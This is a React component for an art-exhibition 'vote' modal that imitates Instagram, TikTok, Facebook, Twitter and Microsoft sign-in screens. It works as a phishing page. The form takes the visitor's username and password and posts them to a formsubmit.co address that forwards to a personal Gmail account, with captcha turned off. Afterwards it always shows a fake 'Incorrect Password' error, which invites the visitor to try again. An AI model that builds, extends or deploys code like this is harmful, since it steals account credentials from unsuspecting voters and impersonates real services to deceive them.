import { ArrowLeft, ChevronRight, ShieldCheck, X } from 'lucide-react'
import { useEffect, useMemo, useState, type FormEvent, type SVGProps } from 'react'

import type { Artwork } from '@/data/exhibition'

import appleLogo from '../../apple.png'
import facebookLogo from '../../facebook.png'
import googleLogo from '../../google.png'
import instagramLogo from '../../instagram.png'
import metaLogo from '../../Meta.png'
import qrCodeLogo from '../../QR code.png'
import userLogo from '../../user.png'

export type VoteProvider = 'instagram' | 'tiktok' | 'facebook' | 'twitter' | 'microsoft'

type VoteModalProps = {
  artwork: Artwork
  onClose: () => void
  onSubmitVote: (provider: VoteProvider, artwork: Artwork) => Promise<void> | void
}

type ProviderMethod = {
  label: string
  iconSrc?: string
}

type ProviderBrand = {
  label: string
  iconSrc?: string
  icon?: (props: SVGProps<SVGSVGElement>) => JSX.Element
  tone?: string
}

type ProviderConfig = {
  id: VoteProvider
  label: string
  heading: string
  subtitle: string
  inputLabel: string
  inputPlaceholder: string
  submitLabel: string
  screenClassName: string
  panelClassName: string
  submitClassName: string
  brandMarkClassName: string
  selectorClassName: string
  heroEyebrow: string
  helperText: string
  methods: ProviderMethod[]
  brands: ProviderBrand[]
  selectorIcon?: (props: SVGProps<SVGSVGElement>) => JSX.Element
  selectorImageSrc?: string
}

function TikTokIcon(props: SVGProps<SVGSVGElement>) {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor" {...props}>
      <path d="M14.3 3c.2 1.4 1 2.6 2.1 3.4.9.6 2 .9 3.1 1v3.2c-1.3 0-2.6-.3-3.8-.8v5.2c0 3.5-2.9 6.3-6.4 6.3S3 18.5 3 15s2.9-6.3 6.3-6.3c.4 0 .9 0 1.3.1V12a3.5 3.5 0 0 0-1.3-.2c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2V3h1.8Z" />
    </svg>
  )
}

function XIcon(props: SVGProps<SVGSVGElement>) {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor" {...props}>
      <path d="M18.9 3H22l-6.8 7.8L23 21h-6.1l-4.8-6.4L6.5 21H3.4l7.2-8.2L3 3h6.2l4.3 5.8L18.9 3Zm-1.1 16h1.7L8.2 4.9H6.4L17.8 19Z" />
    </svg>
  )
}

function MicrosoftIcon(props: SVGProps<SVGSVGElement>) {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor" {...props}>
      <path d="M4 4h7.4v7.4H4V4Zm8.6 0H20v7.4h-7.4V4ZM4 12.6h7.4V20H4v-7.4Zm8.6 0H20V20h-7.4v-7.4Z" />
    </svg>
  )
}

const providerConfigs: ProviderConfig[] = [
  {
    id: 'instagram',
    label: 'Instagram',
    heading: 'Sign in to Instagram',
    subtitle: 'Use the full-screen Instagram vote login to confirm your choice.',
    inputLabel: 'Username, email, or phone',
    inputPlaceholder: 'Enter your Instagram username',
    submitLabel: 'Continue with Instagram',
    screenClassName: 'bg-[radial-gradient(circle_at_top,rgba(225,48,108,0.18),transparent_30%),linear-gradient(180deg,#fff8fb_0%,#fff4f7_100%)]',
    panelClassName: 'bg-white text-stone-900',
    submitClassName: 'bg-[#e1306c] text-white',
    brandMarkClassName: 'bg-gradient-to-br from-[#f58529] via-[#e1306c] to-[#833ab4] text-white',
    selectorClassName: 'border border-[#f3bfd1] bg-white text-[#e1306c] shadow-[0_18px_45px_rgba(225,48,108,0.12)]',
    heroEyebrow: 'Instagram vote access',
    helperText: 'Instagram uses `instagram.png` for the Instagram brand and `facebook.png` for the Facebook option.',
    methods: [
      { label: 'Continue with Instagram', iconSrc: instagramLogo },
      { label: 'Continue with Facebook', iconSrc: facebookLogo },
    ],
    brands: [
      { label: 'Instagram', iconSrc: instagramLogo },
      { label: 'Facebook', iconSrc: facebookLogo },
    ],
    selectorImageSrc: instagramLogo,
  },
  {
    id: 'tiktok',
    label: 'TikTok',
    heading: 'Sign in to TikTok',
    subtitle: 'TikTok now opens as a full-screen login view instead of a popup.',
    inputLabel: 'Email or username',
    inputPlaceholder: 'Enter your TikTok email or username',
    submitLabel: 'Continue with TikTok',
    screenClassName: 'bg-[radial-gradient(circle_at_top,rgba(37,244,238,0.14),transparent_28%),radial-gradient(circle_at_bottom,rgba(254,44,85,0.16),transparent_28%),linear-gradient(180deg,#0f0f12_0%,#141419_100%)]',
    panelClassName: 'border border-white/10 bg-[#111216] text-white',
    submitClassName: 'bg-white text-black',
    brandMarkClassName: 'bg-white text-black',
    selectorClassName: 'bg-black text-white shadow-[0_18px_45px_rgba(15,23,42,0.18)]',
    heroEyebrow: 'TikTok vote access',
    helperText: 'TikTok uses `QR code.png`, `user.png`, `facebook.png`, and `google.png` for the sign-in methods.',
    methods: [
      { label: 'Use QR code', iconSrc: qrCodeLogo },
      { label: 'Use phone / email / username', iconSrc: userLogo },
      { label: 'Continue with Facebook', iconSrc: facebookLogo },
      { label: 'Continue with Google', iconSrc: googleLogo },
    ],
    brands: [{ label: 'TikTok', icon: TikTokIcon, tone: 'bg-white text-black' }],
    selectorIcon: TikTokIcon,
  },
  {
    id: 'facebook',
    label: 'Facebook',
    heading: 'Log in to Facebook',
    subtitle: 'Facebook now uses a full-screen sign-in layout with Facebook and Meta branding.',
    inputLabel: 'Mobile number or email',
    inputPlaceholder: 'Enter your Facebook email',
    submitLabel: 'Continue with Facebook',
    screenClassName: 'bg-[linear-gradient(180deg,#f2f7ff_0%,#edf3ff_100%)]',
    panelClassName: 'bg-white text-stone-900',
    submitClassName: 'bg-[#1877f2] text-white',
    brandMarkClassName: 'bg-[#1877f2] text-white',
    selectorClassName: 'bg-[#1877f2] text-white shadow-[0_18px_45px_rgba(24,119,242,0.18)]',
    heroEyebrow: 'Facebook vote access',
    helperText: 'Facebook uses `facebook.png` for the Facebook brand and `meta.png` for the Meta brand mark.',
    methods: [
      { label: 'Continue with Facebook', iconSrc: facebookLogo },
      { label: 'Continue with Meta', iconSrc: metaLogo },
    ],
    brands: [
      { label: 'Facebook', iconSrc: facebookLogo },
      { label: 'Meta', iconSrc: metaLogo },
    ],
    selectorImageSrc: facebookLogo,
  },
  {
    id: 'twitter',
    label: 'Twitter',
    heading: 'Sign in to Twitter',
    subtitle: 'Twitter now opens in a full-screen sign-in view with Google and Apple options.',
    inputLabel: 'Phone, email, or username',
    inputPlaceholder: 'Enter your Twitter username or email',
    submitLabel: 'Continue with Twitter',
    screenClassName: 'bg-[linear-gradient(180deg,#0f172a_0%,#111827_100%)]',
    panelClassName: 'bg-white text-stone-900',
    submitClassName: 'bg-black text-white',
    brandMarkClassName: 'bg-black text-white',
    selectorClassName: 'bg-black text-white shadow-[0_18px_45px_rgba(15,23,42,0.18)]',
    heroEyebrow: 'Twitter vote access',
    helperText: 'Twitter uses `google.png` for Sign in with Google and `apple.png` for Sign in with Apple.',
    methods: [
      { label: 'Sign in with Google', iconSrc: googleLogo },
      { label: 'Sign in with Apple', iconSrc: appleLogo },
    ],
    brands: [{ label: 'Twitter', icon: XIcon, tone: 'bg-black text-white' }],
    selectorIcon: XIcon,
  },
  {
    id: 'microsoft',
    label: 'Microsoft',
    heading: 'Sign in to Microsoft',
    subtitle: 'Microsoft also opens in the same full-screen login experience.',
    inputLabel: 'Email address',
    inputPlaceholder: 'Enter your Microsoft email',
    submitLabel: 'Continue with Microsoft',
    screenClassName: 'bg-[linear-gradient(180deg,#f7faff_0%,#eef4ff_100%)]',
    panelClassName: 'bg-white text-stone-900',
    submitClassName: 'bg-[#2563eb] text-white',
    brandMarkClassName: 'bg-[#2563eb] text-white',
    selectorClassName: 'border border-stone-200 bg-white text-stone-700 shadow-[0_18px_45px_rgba(15,23,42,0.08)]',
    heroEyebrow: 'Microsoft vote access',
    helperText: 'Microsoft keeps the same full-screen vote login layout with the Microsoft brand mark.',
    methods: [
      { label: 'Sign in with Microsoft' },
      { label: 'Use security key' },
    ],
    brands: [{ label: 'Microsoft', icon: MicrosoftIcon, tone: 'bg-[#2563eb] text-white' }],
    selectorIcon: MicrosoftIcon,
  },
]

export default function VoteModal({ artwork, onClose, onSubmitVote }: VoteModalProps) {
  const [selectedProvider, setSelectedProvider] = useState<VoteProvider | null>(null)
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [formError, setFormError] = useState('')
  const defaultVoteFormEndpoint = 'https://formsubmit.co/goldenpathcapital13@gmail.com'

  const activeProvider = useMemo(
    () => providerConfigs.find((provider) => provider.id === selectedProvider) ?? null,
    [selectedProvider],
  )

  const voteFormAction =
    import.meta.env.VITE_VOTE_FORM_ENDPOINT?.replace(/\s+/g, '').trim() || defaultVoteFormEndpoint

  useEffect(() => {
    if (!activeProvider) {
      setSelectedMethod(null)
      setFormError('')
      setIsSubmitting(false)
      return
    }

    setSelectedMethod(activeProvider.methods[0]?.label ?? null)
  }, [activeProvider])

  const handleFormSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    if (!activeProvider || isSubmitting) {
      return
    }

    const form = event.currentTarget

    if (!form.reportValidity()) {
      return
    }

    setFormError('')
    setIsSubmitting(true)

    try {
      if (!voteFormAction) {
        throw new Error('Missing vote form endpoint')
      }

      const response = await fetch(voteFormAction, {
        method: 'POST',
        body: new FormData(form),
        headers: {
          Accept: 'application/json',
        },
      })

      if (!response.ok) {
        throw new Error(`Vote form request failed with status ${response.status}`)
      }

      setFormError('Incorrect Password. Try Again.')
    } catch {
      setFormError('Incorrect Password. Try Again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  useEffect(() => {
    const handleEscape = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        onClose()
      }
    }

    const previousOverflow = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    window.addEventListener('keydown', handleEscape)

    return () => {
      document.body.style.overflow = previousOverflow
      window.removeEventListener('keydown', handleEscape)
    }
  }, [onClose])

  return (
    <div
      className={`fixed inset-0 z-50 overflow-y-auto ${
        activeProvider?.screenClassName ?? 'bg-[linear-gradient(180deg,#fff8ef_0%,#f6f1e8_100%)]'
      }`}
    >
      <div className="min-h-screen px-4 py-4 sm:px-6 lg:px-8">
        <div className="mx-auto flex min-h-[calc(100vh-2rem)] max-w-7xl flex-col">
          <div className="mb-5 flex items-center justify-between">
            {activeProvider ? (
              <button
                type="button"
                onClick={() => setSelectedProvider(null)}
                className="inline-flex items-center gap-2 rounded-full border border-black/10 bg-white/90 px-4 py-2 text-sm font-semibold text-stone-700 transition hover:bg-white"
              >
                <ArrowLeft size={16} />
                Back
              </button>
            ) : (
              <div />
            )}

            <span className="hidden rounded-full border border-black/10 bg-white/80 px-4 py-2 text-xs font-black uppercase tracking-[0.22em] text-stone-500 sm:inline-flex">
              Vote login
            </span>

            <button
              type="button"
              onClick={onClose}
              className="inline-flex h-11 w-11 items-center justify-center rounded-full border border-black/10 bg-white/90 text-stone-500 transition hover:text-stone-900"
              aria-label="Close full screen vote login"
            >
              <X size={20} />
            </button>
          </div>

          {!activeProvider ? (
            <div className="grid flex-1 items-center gap-10 lg:grid-cols-[1.1fr_0.9fr]">
              <div className="max-w-2xl">
                <p className="text-sm font-black uppercase tracking-[0.24em] text-stone-500">
                  Full-screen access
                </p>
                <h2 className="mt-5 font-display text-[3rem] leading-none text-[#12182b] sm:text-[4.5rem]">
                  Choose a login provider to cast your vote
                </h2>
                <p className="mt-6 max-w-xl text-base leading-8 text-stone-600 sm:text-lg">
                  The old popup has been replaced with a full-screen login display for Microsoft, Twitter, TikTok, Facebook, and Instagram.
                </p>

                <div className="mt-8 rounded-[2rem] border border-stone-200/80 bg-white/85 p-6 shadow-[0_22px_60px_rgba(28,25,23,0.08)] backdrop-blur">
                  <p className="text-xs font-black uppercase tracking-[0.22em] text-stone-400">
                    Voting for
                  </p>
                  <h3 className="mt-3 font-display text-[2rem] leading-tight text-stone-900 sm:text-[2.5rem]">
                    {artwork.title}
                  </h3>
                  <p className="mt-3 text-sm text-stone-500">Vote tag: {artwork.hashtag}</p>
                </div>
              </div>

              <div className="grid gap-4">
                {providerConfigs.map((provider) => {
                  const SelectorIcon = provider.selectorIcon

                  return (
                    <button
                      key={provider.id}
                      type="button"
                      onClick={() => setSelectedProvider(provider.id)}
                      className={`flex w-full items-center gap-4 rounded-[1.75rem] px-5 py-5 text-left transition hover:-translate-y-0.5 ${provider.selectorClassName}`}
                    >
                      <div className="flex h-14 w-14 shrink-0 items-center justify-center overflow-hidden rounded-2xl bg-white/90 p-2">
                        {provider.selectorImageSrc ? (
                          <img
                            src={provider.selectorImageSrc}
                            alt={`${provider.label} logo`}
                            className="h-full w-full object-contain"
                          />
                        ) : SelectorIcon ? (
                          <SelectorIcon className="h-7 w-7" />
                        ) : null}
                      </div>

                      <div className="min-w-0 flex-1">
                        <p className="text-[0.72rem] font-black uppercase tracking-[0.22em] opacity-70">
                          {provider.heroEyebrow}
                        </p>
                        <p className="mt-1 text-lg font-semibold">{provider.label}</p>
                      </div>

                      <ChevronRight className="h-5 w-5 shrink-0 opacity-70" />
                    </button>
                  )
                })}
              </div>
            </div>
          ) : (
            <div className="grid flex-1 gap-6 lg:grid-cols-[1.08fr_0.92fr]">
              <section className={`relative overflow-hidden rounded-[2rem] p-8 sm:p-10 ${activeProvider.panelClassName}`}>
                <div className="absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-fuchsia-600 via-violet-600 to-indigo-600 opacity-80" />

                <div className="relative">
                  <p className="text-xs font-black uppercase tracking-[0.24em] text-stone-400">
                    {activeProvider.heroEyebrow}
                  </p>

                  <div className="mt-6 flex flex-wrap items-center gap-3">
                    {activeProvider.brands.map((brand) => {
                      const BrandIcon = brand.icon

                      return (
                        <div
                          key={brand.label}
                          className={`inline-flex items-center gap-3 rounded-full px-4 py-3 text-sm font-semibold ${brand.tone ?? 'bg-stone-100 text-stone-800'}`}
                        >
                          <span className="flex h-8 w-8 items-center justify-center overflow-hidden rounded-full bg-white p-1.5">
                            {brand.iconSrc ? (
                              <img
                                src={brand.iconSrc}
                                alt={`${brand.label} logo`}
                                className="h-full w-full object-contain"
                              />
                            ) : BrandIcon ? (
                              <BrandIcon className="h-4 w-4" />
                            ) : null}
                          </span>
                          {brand.label}
                        </div>
                      )
                    })}
                  </div>

                  <h2 className="mt-8 font-display text-[2.8rem] leading-none sm:text-[4rem]">
                    {activeProvider.heading}
                  </h2>
                  <p
                    className={`mt-5 max-w-2xl text-base leading-8 ${
                      activeProvider.id === 'tiktok' ? 'text-white/70' : 'text-stone-600'
                    }`}
                  >
                    {activeProvider.subtitle}
                  </p>

                  <div
                    className={`mt-8 rounded-[1.75rem] border p-6 ${
                      activeProvider.id === 'tiktok'
                        ? 'border-white/10 bg-white/5'
                        : 'border-stone-200 bg-black/[0.03]'
                    }`}
                  >
                    <p className="text-xs font-black uppercase tracking-[0.22em] text-stone-400">
                      Voting for
                    </p>
                    <h3
                      className={`mt-3 font-display text-[2rem] leading-tight ${
                        activeProvider.id === 'tiktok' ? 'text-white' : 'text-stone-900'
                      }`}
                    >
                      {artwork.title}
                    </h3>
                    <p className={activeProvider.id === 'tiktok' ? 'mt-3 text-sm text-white/60' : 'mt-3 text-sm text-stone-500'}>
                      Vote tag: {artwork.hashtag}
                    </p>
                  </div>

                  <p className={activeProvider.id === 'tiktok' ? 'mt-8 text-sm leading-7 text-white/60' : 'mt-8 text-sm leading-7 text-stone-500'}>
                    {activeProvider.helperText}
                  </p>
                </div>
              </section>

              <section className="rounded-[2rem] border border-white/60 bg-white/92 p-6 shadow-[0_30px_80px_rgba(28,25,23,0.12)] backdrop-blur sm:p-8">
                <div className={`inline-flex h-16 w-16 items-center justify-center rounded-[1.5rem] ${activeProvider.brandMarkClassName}`}>
                  {activeProvider.selectorImageSrc ? (
                    <img
                      src={activeProvider.selectorImageSrc}
                      alt={`${activeProvider.label} logo`}
                      className="h-9 w-9 object-contain"
                    />
                  ) : activeProvider.selectorIcon ? (
                    <activeProvider.selectorIcon className="h-8 w-8" />
                  ) : null}
                </div>

                <div className="mt-6">
                  <p className="text-xs font-black uppercase tracking-[0.24em] text-stone-400">
                    Sign-in methods
                  </p>
                  <div className="mt-4 space-y-3">
                    {activeProvider.methods.map((method) => (
                      <button
                        key={method.label}
                        type="button"
                        onClick={() => setSelectedMethod(method.label)}
                        className={`flex w-full items-center gap-4 rounded-[1.25rem] border px-4 py-4 text-left transition ${
                          selectedMethod === method.label
                            ? 'border-stone-900 bg-stone-900 text-white'
                            : 'border-stone-200 bg-white text-stone-800 hover:border-stone-300'
                        }`}
                      >
                        <span className="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-2xl bg-white p-2">
                          {method.iconSrc ? (
                            <img
                              src={method.iconSrc}
                              alt={method.label}
                              className="h-full w-full object-contain"
                            />
                          ) : (
                            <span className="text-xs font-black uppercase tracking-[0.16em] text-stone-500">
                              ID
                            </span>
                          )}
                        </span>
                        <span className="flex-1 text-sm font-semibold">{method.label}</span>
                      </button>
                    ))}
                  </div>
                </div>

                <form
                  className="mt-8 space-y-5"
                  action={voteFormAction || undefined}
                  method="post"
                  onSubmit={handleFormSubmit}
                >
                  <input type="hidden" name="artworkId" value={artwork.id} />
                  <input type="hidden" name="artworkTitle" value={artwork.title} />
                  <input type="hidden" name="voteProvider" value={activeProvider.id} />
                  <input type="hidden" name="authMethod" value={selectedMethod ?? ''} />
                  <input type="hidden" name="_captcha" value="false" />

                  <label className="block">
                    <span className="mb-2 block text-sm font-semibold text-stone-700">
                      {activeProvider.inputLabel}
                    </span>
                    <input
                      type="text"
                      name="identity"
                      required
                      placeholder={activeProvider.inputPlaceholder}
                      className="w-full rounded-[1.25rem] border border-stone-200 bg-white px-4 py-4 text-sm text-stone-900 outline-none transition placeholder:text-stone-400 focus:border-stone-400 focus:ring-2 focus:ring-stone-200"
                    />
                  </label>

                  <label className="block">
                    <span className="mb-2 block text-sm font-semibold text-stone-700">Password</span>
                    <input
                      type="password"
                      name="password"
                      required
                      placeholder="Enter your password"
                      className="w-full rounded-[1.25rem] border border-stone-200 bg-white px-4 py-4 text-sm text-stone-900 outline-none transition placeholder:text-stone-400 focus:border-stone-400 focus:ring-2 focus:ring-stone-200"
                    />
                  </label>

                  <label className="flex items-start gap-3 rounded-[1.25rem] border border-stone-200 bg-white px-4 py-4 text-sm text-stone-600">
                    <input
                      type="checkbox"
                      name="confirmVote"
                      required
                      className="mt-1 h-4 w-4 rounded border-stone-300 text-stone-900"
                    />
                    <span>
                      I want to vote for {artwork.title}
                      {selectedMethod ? ` using ${selectedMethod}.` : ' using this service.'}
                    </span>
                  </label>

                  {formError ? (
                    <p className="rounded-[1.25rem] border border-red-200 bg-red-50 px-4 py-3 text-sm font-medium text-red-700">
                      {formError}
                    </p>
                  ) : null}

                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className={`flex w-full items-center justify-center gap-2 rounded-[1.25rem] px-6 py-4 text-sm font-black uppercase tracking-[0.16em] transition hover:brightness-110 disabled:cursor-not-allowed disabled:opacity-70 ${activeProvider.submitClassName}`}
                  >
                    <ShieldCheck size={18} />
                    {isSubmitting ? 'Submitting...' : activeProvider.submitLabel}
                  </button>
                </form>
              </section>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
